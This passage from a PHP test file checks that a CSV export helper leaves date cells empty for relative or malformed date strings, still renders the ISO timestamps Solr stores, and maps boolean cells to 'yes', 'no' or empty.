       one method above refuses to turn an absent value into 0 and says why; this is that rule,
       and a document read back from Solr is untrusted input like anything else. */
    'a date cell is an absolute instant or it is empty' =>
    function (): void {
        foreach ([
            'now',
            'tomorrow',
            'yesterday 14:00',
            '-1 year',
            '+1 day',
            'next friday',
            '@0',
            'midnight',
            '2026',
            '09/11/2026',
            'garbage',
            ' ',
        ] as $fabricator) {
            lh_same(
                '',
                Csv::moment($fabricator, 'UTC'),
                'a spreadsheet must not be handed a timestamp nobody measured: ' . $fabricator
            );
        }

        lh_same(
            '09/11/2026 10:00:00',
            Csv::moment('2026-09-11T10:00:00Z', 'UTC'),
            'and the shape a Solr date field actually holds still renders'
        );
        lh_same(
            '09/11/2026 10:00:00',
            Csv::moment('2026-09-11T10:00:00.250Z', 'UTC'),
            'including with the fractional seconds Solr writes'
        );
    },

    'a boolean cell has three states and a structure is none of them' =>
    function (): void {
        lh_same('', Csv::flag(null), 'absent stays absent');
        lh_same('', Csv::flag([]), 'an array is not a "no"');
        lh_same('', Csv::flag(['x']), 'and it is not a "yes" either');
        lh_same('yes', Csv::flag(true));
        lh_same('no', Csv::flag(false));
        lh_same('no', Csv::flag('false'), 'the string Solr writes for a false boolean');
        lh_same('yes', Csv::flag('true'));
    },

];
